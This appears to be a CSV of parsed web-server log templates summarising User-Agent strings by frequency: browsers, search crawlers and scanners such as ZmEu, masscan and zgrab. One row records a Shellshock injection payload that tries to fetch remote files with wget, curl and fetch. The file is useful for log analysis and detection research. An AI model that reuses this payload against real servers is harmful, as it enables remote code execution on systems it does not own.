EventId,EventTemplate,Occurrences
8004b04d,Mozilla/<*>.<*> <*> <*> <*> <*> rv:<*>.<*>) Gecko/<*> Firefox/<*>.<*>,12452
ee44e5e2,WordPress/<*>.<*>.<*>; <*>,1047
336d5ebc,-,958
23497c84,Mozilla/<*>.<*> (compatible; <*> <*>,12559
7f7850f9,Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64) <*> <*> like Gecko) <*> Safari/<*>.<*>,915
dad68822,"Mozilla/<*>.<*> <*> <*> <*> <*> (KHTML, like Gecko) <*> Safari/<*>.<*>",1450
a7f372dd,"Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> x64) <*> (KHTML, like Gecko) <*> Safari/<*>.<*>",11995
0a692a0c,Mozilla/<*>.<*> <*> U; Windows NT <*>.<*>; <*> <*> Gecko/<*> <*>,547
40e3dfff,Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> <*> <*> <*>,57
a5a58065,ZmEu,186
5d81860b,Mozilla/<*>.<*> (X11; Linux <*> <*> Gecko/<*> <*>,41
49ea2550,Mozilla/<*>.<*> <*> MSIE <*> Windows NT <*> <*>,909
1040de9d,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; AOL <*>.<*>; Windows NT <*>.<*>),9
8de78789,okhttp/<*>.<*>.<*>,3
1619f2ce,"Mozilla/<*>.<*> (compatible; DotBot/<*>.<*>; http://www.opensiteexplorer.org/dotbot, help@moz.com)",116
2b03a4c6,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> <*> <*> <*> <*> .NET CLR <*>.<*>.<*>),7
416494cd,"Mozilla/<*>.<*> <*> <*> <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> <*> <*>",117
49a666a8,Mozilla/<*>.<*> (Macintosh; Intel Mac OS X <*> <*> <*> like Gecko) <*> <*>,6010
98c10d02,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; en-us; Nexus <*> Build/JOP40D) AppleWebKit/<*>.<*> (KHTML, like Gecko; googleweblight) Chrome<*> Mobile Safari/<*>.<*>",171
336249ab,masscan/<*>.<*> (https://github.com/robertdavidgraham/masscan),37
6b3a3222,Mozilla/<*>.<*> (Windows NT <*> <*> x64; <*> Gecko/<*> <*>,549
ebc120b7,WordPress/<*>.<*>; http://cityspin.net,57
aa1d5393,Mozilla/<*>.<*> (Macintosh; Intel Mac OS <*> <*> <*> <*> <*>,35
c6715a18,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; Trident/<*>.<*>; SLCC2; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; Media Center PC <*>.<*>),147
76c62731,"Mozilla/<*>.<*> (Macintosh; U; <*> Mac OS X <*>_<*>_<*>) AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> Edge/<*>.<*>",81
fa72d011,"Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> x64) <*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> <*>",88
e020d5cd,Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> <*> <*>,224
3c178985,Mozilla/<*>.<*> (Windows; U; Windows NT <*>.<*>;en-US; rv:<*>.<*>.<*>) Gecko/<*> Firefox/<*>.<*>),58
bd7443a8,"Mozilla/<*>.<*> (Macintosh; Intel Mac OS X <*>_<*>_<*>) <*> (KHTML, like Gecko) Chrome<*> <*> <*>",53
f3847f0d,Mozilla/<*>.<*> (Windows NT <*>.<*>; rv:<*>.<*>) Gecko Firefox/<*>.<*> (via ggpht.com GoogleImageProxy),3
53a8a56a,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows <*> <*> <*> <*>,113
4c55ba51,Mozilla/<*>.<*> (compatible; Linux x86_<*>; Mail.RU_Bot/<*>.<*>; +http://go.mail.ru/help/robots),34
a55a1c14,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*>,36
a9e2fc05,Sogou web spider/<*>.<*>(+http://www.sogou.com/docs/help/webmasters.htm#<*>),15
580df61c,HTTP Banner Detection (https://security.ipip.net),4
9db91164,Mozilla/<*>.<*> (compatible; MSIE <*>.0b; Windows NT <*>.<*> ; .NET CLR <*>.<*>.<*>; SL Commerce Client v1.<*>; Tablet PC <*>.<*>,3
d2495a7e,Googlebot/<*>.<*> (+http://www.google.com/bot.html),41
81546f84,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; Nexus 5X Build/MMB29P) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Mobile Safari/<*>.<*> (compatible; Googlebot/<*>.<*>; +http://www.google.com/bot.html)",581
588ef033,Mozilla/<*>.<*> Beta (Windows),9
86c9edc9,"Mozilla/<*>.<*> () AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> Edge/<*>.<*>",2
a8ba5604,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; .NET CLR <*>.<*>.<*>; <*> <*> <*>,2
71c59530,Opera/<*>.<*> (Windows NT <*> <*> <*>,19
a4d28e2e,Mozilla/<*>.<*> (compatible; MSIE <*> Windows <*>,39
cc2d630f,NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com,2
4fd1f5c1,GigablastOpenSource/<*>.<*>,4
64d69c62,"Mozilla/<*>.<*> <*> <*> <*> <*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> OPR<*>",25
fd6d41bb,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> <*> <*> <*>,16
e2f34582,"Mozilla/<*>.<*> (Macintosh; Intel Mac OS X <*>_<*>_<*>) AppleWebKit/<*>.<*>.<*> (KHTML, like Gecko) Version/<*>.<*>.<*> Safari/<*>.<*>.<*> (Applebot/<*>.<*>; +http://www.apple.com/go/applebot)",13
63e4e417,msnbot/<*>.0b (+http://search.msn.com/msnbot.htm),49
fd65da26,Barkrowler/<*>.<*> (+https://babbar.tech/crawler),70
94f798b4,LightspeedSystemsCrawler Mozilla/<*>.<*> (Windows; U; MSIE <*>.<*>; Windows NT <*>.<*>; en-US),24
60fd11fb,Mozilla/<*>.<*> (Windows; U; Windows NT <*>.<*>; rv:<*>.<*>) Gecko/<*>,1
0ec1548c,success agent,61
ed8eb1d5,curl/<*>.<*>.<*>,41
fdf1c1b2,Mozilla/<*>.<*> (compatible- MSIE <*>.<*>- Windows NT <*>.<*>- SV1- .NET CLR <*>.<*>.<*>,6
fcbe6ad4,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows <*> <*> <*> <*> <*>,44
383adf81,"Mozilla/<*>.<*> (X11; Linux x86_<*>) AppleWebKit/<*>.<*> (KHTML, like Gecko) <*> <*> <*> <*>",158
96d589b1,Go-http-client/<*>.<*>,36
ccc4eb9d,Blackboard Safeassign,6
7f048982,Mozilla/<*>.<*> (compatible; Seekport Crawler; http://seekport.com/),52
cff16431,Mozilla/<*>.<*> (compatible; <*> <*> Windows NT <*>.<*>; WOW64; <*> <*> <*> <*>,10
986c3748,Chrome,2
e6815d3a,Googlebot-Image/<*>.<*>,22
fd0aa17c,Mozilla/<*>.<*> (X11; U; Linux i686)Gecko/<*> Firefox<*>,4
1ca3ac8c,python-requests/<*>.<*>.<*>,27
366170e0,Mozilla/<*>.<*> (Windows NT <*>.<*>; Win64; x64; Trident/<*>.<*>; rv:<*>.<*>) like Gecko,15
efb3b061,"Mozilla/<*>.<*> AppleWebKit/<*>.<*> (KHTML, like Gecko; compatible; Googlebot/<*>.<*>; +http://www.google.com/bot.html) Chrome<*> Safari/<*>.<*>",19
30126c9d,facebookexternalhit/<*>.<*> (+http://www.facebook.com/externalhit_uatext.php),8
b7e8c996,Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64; Trident/<*>.<*>; rv:<*>.<*>) like Gecko,114
ccc3ab74,"Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64) AppleWebKit/<*>+ (KHTML, like Gecko) BingPreview/<*>.0b",34
3a27c588,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows <*> <*>,118
5c123514,Mozilla/<*>.<*>,4
1f697f37,CheckMarkNetwork/<*>.<*> (+http://www.checkmarknetwork.com/spider.html),23
64b8a3b8,"Mozilla/<*>.<*> (Windows NT <*>.<*>; <*> <*> (KHTML, like Gecko) <*> <*> <*>",122
ff0ca925,ltx71 - (http://ltx71.com/),19
11ba488d,Dispatch/<*>.<*>.<*>,21
15534caa,Mozilla/<*>.<*> (compatible; <*>,35
5717b0e6,"Mozilla/<*>.<*> (Linux; Android <*> <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Mobile Safari/<*>.<*>",25
d7f751ac,Opera/<*>.<*> (Windows NT <*>.<*>),6
b0f933f3,Mozilla/<*>.<*> (x86 [en] Windows NT <*>.<*>; Sun),3
54e795ef,check_http/v2.<*>.<*> (nagios-plugins <*>.<*>.<*>),10754
d0a7095a,curl/<*>.<*>.<*> (mips-unknown-linux-gnu) libcurl/<*>.<*>.<*> OpenSSL/<*>.<*>.8i zlib/<*>.<*>.<*>,199
33e398db,Mozilla/<*>.<*> (compatible; MSIE <*>.<*>; Windows NT <*>.<*>; <*> <*> <*> <*> .NET CLR <*> .NET CLR <*>.<*>.<*>),15
bbf95156,"() { :;};/usr/bin/perl -e 'print \""Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\"";system(\""wget http:/<*>/YOUR_URL_HERE ; curl -O http:/<*>/YOUR_URL_HERE ; fetch http:/<*>/YOUR_URL_HERE\"");'",30
73be0af7,"Mozilla/<*>.<*> (Windows NT <*>.<*>; WOW64) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Safari/<*>.<*> SE <*>.X MetaSr <*>.<*>",2
f09fa319,Wget(linux),174
02875f64,Mozilla/<*>.<*> (X11; <*> Linux i686; <*> <*> <*>,4
f028e62a,"Mozilla/<*>.<*> (Linux; Android <*>.<*>; Lenovo A1000 Build/S100) AppleWebKit/<*>.<*> (KHTML, like Gecko) Chrome<*> Mobile Safari/<*>.<*> OPR<*>",2
be6fedc6,"Mozilla/<*>.<*> AppleWebKit/<*>.<*> (KHTML, like Gecko; Google Web Preview Analytics) Chrome/<*>.<*>.<*> Safari/<*>.<*> (compatible; Googlebot/<*>.<*>; +http://www.google.com/bot.html)",27
127c3679,Dalvik/<*>.<*>.<*> (Linux; U; Android <*>.<*>.<*>; R2001 Build/JDQ39),4
60d8d549,Cloud mapping experiment. Contact research@pdrlabs.net,5
d3d9c0d8,Mozilla/<*>.<*> (Windows; U; Windows NT <*>.<*>; en; rv:<*>) Gecko/<*> Firefox/<*>.<*>.<*> (.NET CLR <*>.<*>.<*>) SurveyBot/<*>.<*> (DomainTools),45
c0e84420,Mozilla/<*>.<*> <*> <*> Windows NT <*> <*> rv:<*>) Gecko/<*> <*> <*> <*> CLR <*>.<*>.<*>),8
e29ee850,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; <*> <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Mobile Safari/<*>.<*> GSA<*>.arm",9
21ad0bd8,bb,1
107e1268,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; SM-T116NU Build/KTU84P) AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Safari/<*>.<*> GSA<*>.arm",1
61bb6b83,Telesphoreo,19
836ce196,Twitterbot/<*>.<*>,30
49c118c9,Mozilla/<*>.<*> (Windows U Windows NT <*>.<*> ru rv:<*>) Gecko/<*> MRA <*>.<*> (build <*>) Firefox/<*>.<*>.<*> (.NET CLR <*>.<*>.<*>) sputnik <*>,1
0bb5d344,Mozilla/<*>.<*> (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp),40
bfa1c485,the beast,7
38c8303a,Mozilla/<*>.<*> (Android <*>.<*>; Mobile; rv:<*>.<*>) Gecko/<*>.<*> Firefox/<*>.<*>,26
d558024d,Mozilla/<*>.<*> zgrab/<*>.x,65
99f34a21,roboto,10
a768ba72,"<a href=\""http://forum.windowsfaq.ru/\"">Forum.WindowsFAQ.ru</a>",7
793914c9,md,1
7cdcfa8e,"Mozilla/<*>.<*> (Linux; Android <*>.<*>.<*>; <*> <*> AppleWebKit/<*>.<*> (KHTML, like Gecko) Version/<*>.<*> Chrome<*> Mobile Safari/<*>.<*> GSA<*>.arm",2
